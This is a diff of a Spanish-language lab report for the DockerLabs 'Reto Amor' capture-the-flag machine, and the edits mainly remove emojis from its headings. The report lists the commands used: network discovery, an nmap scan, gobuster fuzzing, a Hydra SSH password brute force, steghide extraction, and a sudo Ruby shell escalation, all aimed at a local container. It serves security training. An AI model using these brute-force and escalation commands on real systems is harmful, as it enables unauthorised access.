@@ -1,6 +1,6 @@
-#**<h6> 🐳 Taller Individual: Análisis del Laboratorio DockerLabs - "Reto Amor"<h6>**
+#**Taller Individual: Análisis del Laboratorio DockerLabs - "Reto Amor"**
 
-## <h5>🔍 1. Cuadro Comparativo de Herramientas Empleadas <h5>
+## <h5> 1. Cuadro Comparativo de Herramientas Empleadas <h5>
 | **Herramienta** | **Definición** | **Funcionalidad Principal** | **Casos de Uso Comunes** |
 |----------------|----------------|-----------------------------|---------------------------|
 | `scp`          | Herramienta de copia segura entre equipos a través de SSH. | Copiar archivos/directorios entre sistemas locales y remotos. | Transferencia de archivos entre servidores, backup remoto. |
@@ -21,8 +21,8 @@
 
 ![Herramientas Utilizadas](Images/1.png)
 
-##**🧠 EXPLICACIÓN DETALLADA DE COMANDOS Y VARIANTES**
-### 📦 Transferencia con `scp`
+##**EXPLICACIÓN DETALLADA DE COMANDOS Y VARIANTES**
+### Transferencia con `scp`
 
 ```bash
 scp -r amor kali@192.168.1.12:/home/kali/Documents/
@@ -32,11 +32,11 @@ scp -r amor kali@192.168.1.12:/home/kali/Documents/
 - **Variantes**:
   - `scp archivo.txt user@host:/ruta/`
   - `scp user@host:/archivo.txt ./`
-  - `scp -P 2222 archivo.txt user@host:/
+  - `scp -P 2222 archivo.txt user@host:/`
 
 ![Copia Segura al Sistema Remoto](Images/2.png)
 
-### 🐳 **Instalación de Docker**
+### **Instalación de Docker**
 
 ```bash
 sudo apt install docker.io
@@ -49,7 +49,7 @@ sudo apt install docker.io
   - `snap install docker`
 ![Métodos de Instalación de Docker](Images/3.png)
 
-### 📂 Descompresión de Archivos
+### Descompresión de Archivos
 
 ```bash
 unzip nombre_maquina.zip
@@ -63,7 +63,7 @@ unzip nombre_maquina.zip
   - 
 ![Opciones de Descompresión](Images/4.png)
 
-### 🔐 Cambiar permisos con `chmod`
+### Cambiar permisos con `chmod`
 
 ```bash
 chmod +x auto_deploy.sh
@@ -77,7 +77,7 @@ chmod +x auto_deploy.sh
 
 ![Variantes del Comando Chmod](Images/5.png)
 
-### 🌐 Visualizar Interfaces de Red
+### Visualizar Interfaces de Red
 
 ```bash
 ip add
@@ -90,7 +90,7 @@ ip add
     
 ![Metodos para Mostrar Interfaces de Red](Images/6.png)
 
-### 🌍 **Descubrimiento de red**
+### **Descubrimiento de red**
 
 ```bash
 sudo netdiscover -i docker0 -r 172.17.0.0/24
@@ -104,7 +104,7 @@ sudo netdiscover -i docker0 -r 172.17.0.0/24
 
 ![Descubrimiento Dispositivos Activos en la Red](Images/7.png)
 
-### 📡 **Escaneo de servicios con Nmap**
+### **Escaneo de servicios con Nmap**
 
 ```bash
 sudo nmap --min-rate 5000 -p- -sS -sV 172.17.0.2
@@ -117,7 +117,7 @@ sudo nmap --min-rate 5000 -p- -sS -sV 172.17.0.2
 -T4: Ajusta la velocidad del escaneo.
 ![Componentes de un Escaneo de Red Efectivo](Images/8.png)
 
-### 🕸 Fuzzing Web con Gobuster
+### Fuzzing Web con Gobuster
 
 ```bash
 gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
@@ -131,7 +131,7 @@ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-l
 
 ![Proceso de Enumeración de Directorios Web](Images/9.png)
 
-### 🔓 Ataque de Fuerza Bruta con Hydra
+### Ataque de Fuerza Bruta con Hydra
 
 ```bash
 hydra -l carlota -P rockyou.txt ssh://172.17.0.2 -t 10
@@ -147,7 +147,7 @@ hydra -l carlota -P rockyou.txt ssh://172.17.0.2 -t 10
 ![Proceso de Ataque de Fuerza Bruta SSH](Images/10.png)
 
 
-### 📥 Descarga Remota con `scp`
+### Descarga Remota con `scp`
 
 ```bash
 scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor
@@ -156,7 +156,7 @@ scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/k
 -**Descripción**:Descarga la imagen del host remoto.
 -**Variantes**:Ver variantes ya descritas en el primer comando scp.
 
-### 🧪 Análisis de tipo de archivo
+### Análisis de tipo de archivo
 
 ```bash
 file imagen.jpg
@@ -170,7 +170,7 @@ file imagen.jpg
 
 ![Comandos para la Gestión de Archivos](Images/11.png)
 
-### 🕵️ Esteganografía con Steghide
+### Esteganografía con Steghide
 
 ```bash
 steghide --extract -sf imagen.jpg
@@ -183,7 +183,7 @@ steghide --extract -sf imagen.jpg
 
 ![Proceso de Esteganografía](Images/12.png)
 
-### 🔐 Decodificación con Base64
+### Decodificación con Base64
 
 ```bash
 echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo
@@ -198,7 +198,7 @@ echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo
 
 
 
-### 🧑‍💻 Escalada con Sudo + Ruby
+### Escalada con Sudo + Ruby
 
 ```bash
 sudo /usr/bin/ruby -e 'exec "/bin/bash"': Shell escalada vía Ruby.
